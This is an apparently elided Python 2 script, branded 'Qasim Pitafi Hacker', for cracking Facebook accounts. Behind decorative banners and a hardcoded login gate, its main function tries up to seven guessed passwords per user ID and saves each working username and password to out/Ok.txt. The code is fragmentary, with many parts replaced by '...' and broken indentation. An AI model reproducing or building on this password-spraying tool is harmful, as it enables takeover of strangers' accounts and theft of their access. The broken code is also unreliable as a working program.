#!/usr/bin/python2
#coding=utf-8
#The Credit For This Code Goes To Qasim pitafi hacker
...
\033[1;95m♡╭──────────•◈•──────────╮♡\033[1;96m-QASIM PITAFI HACKER-\033[1;95m♡╭──────────•◈•──────────╮♡
\033[1;92m..........................QASIM PITAFI HACKER......................
\033[1;93m╔╗ ╔╗╔═╦╦╦═╗ ╔╗╔╦═╦╦╗
\033[1;93m║║ ║╚╣║║║║╩╣ ╚╗╔╣║║║║   QASIM PITAFI HACKER
\033[1;93m╚╝ ╚═╩═╩═╩═╝═ ╚╝╚═╩═╝ 
\033[1;95m♡╰──────────•◈•──────────╯♡\033[1;96mQASIMPITAFIHACKER\033[1;95m♡╰──────────•◈•──────────╯♡"""
...
print  """
 ...
 \033[1;96m ┈┈┈┈┈┈┈┈╱▔▔▔▔┊┊┊┊▔▔▔▔╲┈┈┈┈
  \033[1;96m ─────────────•◈•──────────  
   \033[1;92m███████▒▒Welcome To QASIM PITAFI HACKER▒▒████████
\033[1;95m♡╭──────────•◈•──────────╮♡\033[1;96mBlackMafia\033[1;95m♡╭──────────•◈•──────────╮♡
\033[1;94mAuthor\033[1;91m: \033[1;91mQasimpitafihacker
\033[1;94mQASIM PITAFI HACKER\033[1;91m: \033[1;91▒▓██████████████]99.9
\033[1;94mFacebook\033[1;91m: \033[1;91mqasim pitafi hacker
\033[1;94mWhatsapp\033[1;91m: \033[1;91m+923094161457
\033[1;95m♡╰──────────•◈•──────────╯♡\033[1;96mQasim pitafi hacker\033[1;95m♡╰──────────•◈•──────────╯♡"""
jalan('              \033[1;96m....................Qasim pitafi hacker.....................:')
jalan("\033[1;93m   ┈┈┈┈┈┈┈┈╱▔▔▔▔╲┈┈┈┈┈┈┈┈   ")
jalan('\033[1;93m   ┈┈┈┈┈┈┈▕▕╲┊┊╱▏▏┈┈┈┈┈┈┈   ')
jalan('\033[1;93m   ┈┈┈┈┈┈┈▕▕▂╱╲▂▏▏┈┈┈┈┈┈┈   ')
jalan("\033[1;93m   ┈┈┈┈┈┈┈┈╲┊┊┊┊╱┈┈┈┈┈┈┈┈ ")
jalan("\033[1;93m   ┈┈┈┈┈┈┈┈▕╲▂▂╱▏┈┈┈┈┈┈┈┈")
print "\033[1;93m♡─────╱▔▔▔▔┊┊┊┊▔▔▔▔╲───────♡\033[1;96mLogin QASIM PITAFI HACKER\033[1;95m♡╰──────────•◈•──────────╯♡"

CorrectUsername = "PITAFI"
...
while (loop == 'true'):
    ...
    if (username == CorrectUsername):
        ...
        if (password == CorrectPassword):
            print "Logged in successfully as " + username #QASIM PITAFI HACKER
	    time.sleep(2)
            loop = 'false'
        else:
...
def login():
	...
	try:
		...
		print "\033[1;95m♡──────────•◈•──────────♡\033[1;96mQASIM PITAFI HACKER\033[1;95m♡──────────•◈•──────────♡"
		...
		if 'save-device' in url:
			try:
				...
				keluar()
		if 'OK' in url:
			print("\n\x1b[1;92mYour Account is on OK")
...
def menu():
	...
	try:
		...
		os.system('clear')
		print"\033[1;91mYour Account is on OK"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	except requests.exceptions.ConnectionError:
		...
		keluar()
	os.system("clear") #QASIM PITAFI HACKER
	print logo
...
def pilih_super():
	...
	if peak =="":
		...
		print "\033[1;95m♡──────────•◈•──────────♡\033[1;96mQASIMPITAFIHACKER\033[1;95m♡──────────•◈•──────────╯♡"
		try:
		...
		try:
			...
			if 'access_token' in q:
				...
				if 'www.facebook.com' in q["error_msg"]:
					print '\x1b[1;95mOk\x1b[1;97m-\x1b[1;94m✧\x1b[1;97m-' + user + '-\x1b[1;94m✧\x1b[1;97m-' + pass1
					ok = open("out/Ok.txt", "a")
					ok.write(user+"|"+pass1+"\n")
					ok.close()
					...
					if 'access_token' in q:
						...
						if 'www.facebook.com' in q["error_msg"]:
							print '\x1b[1;95mOk\x1b[1;97m-\x1b[1;94m✧\x1b[1;97m-' + user + '-\x1b[1;94m✧\x1b[1;97m-' + pass2
							ok = open("out/Ok.txt", "a")
							ok.write(user+"|"+pass2+"\n")
							ok.close()
							...
							if 'access_token' in q:
								...
								if 'www.facebook.com' in q["error_msg"]:
									print '\x1b[1;95mOk\x1b[1;97m-\x1b[1;94m✧\x1b[1;97m-' + user + '-\x1b[1;94m✧\x1b[1;97m-' + pass3
									ok = open("out/Ok.txt", "a")
									ok.write(user+"|"+pass3+"\n")
									ok.close()
									...
									if 'access_token' in q:
										...
										if 'www.facebook.com' in q["error_msg"]:
											print '\x1b[1;95mOk\x1b[1;97m-\x1b[1;94m✧\x1b[1;97m-' + user + '-\x1b[1;94m✧\x1b[1;97m-' + pass4
											ok = open("out/Ok.txt", "a")
											ok.write(user+"|"+pass4+"\n")
											ok.close()
											...
											if 'access_token' in q:
												...
												if 'www.facebook.com' in q["error_msg"]:
													print '\x1b[1;95mOk\x1b[1;97m-\x1b[1;94m✧\x1b[1;97m-' + user + '-\x1b[1;94m✧\x1b[1;97m-' + pass5
													ok = open("out/Ok.txt", "a")
													ok.write(user+"|"+pass5+"\n")
													ok.close()
													...
													if 'access_token' in q:
														...
														if 'www.facebook.com' in q["error_msg"]:
															print '\x1b[1;95mOk\x1b[1;97m-\x1b[1;94m✧\x1b[1;97m-' + user + '-\x1b[1;94m✧\x1b[1;97m-' + pass6
															ok = open("out/Ok.txt", "a")
															ok.write(user+"|"+pass6+"\n")
															ok.close()
															...
															if 'access_token' in q:
																...
																if 'www.facebook.com' in q["error_msg"]:
																	print '\x1b[1;95mOk\x1b[1;97m-\x1b[1;94m✧\x1b[1;97m-' + user + '-\x1b[1;94m✧\x1b[1;97m-' + pass7
																	ok = open("out/Ok.txt", "a")
																	ok.write(user+"|"+pass7+"\n")
																	ok.close()
	...
	print "  \033[1;93m«---•◈•---Developed By qasim---•◈•---»" #qasim pitafi hacker
	print '\033[1;91mProcess Has Been Completed\033[1;92m....'
	print"\033[1;91mTotal OK/\x1b[1;93mCP \033[1;91m: \033[1;91m"+str(len(oks))+"\033[1;97m/\033[1;95m"+str(len(okids))
	print """
             ...
             ◥⊙▲⊙▲⊙▲⊙▲⊙▲⊙◤
♡──────────────•◈•──────────────♡.
: \033[1;96m .....love qasim pitafi hacker........... \033[1;93m :
♡──────────────•◈•──────────────♡.' 
                whatsapp Num
               +923063261665"""
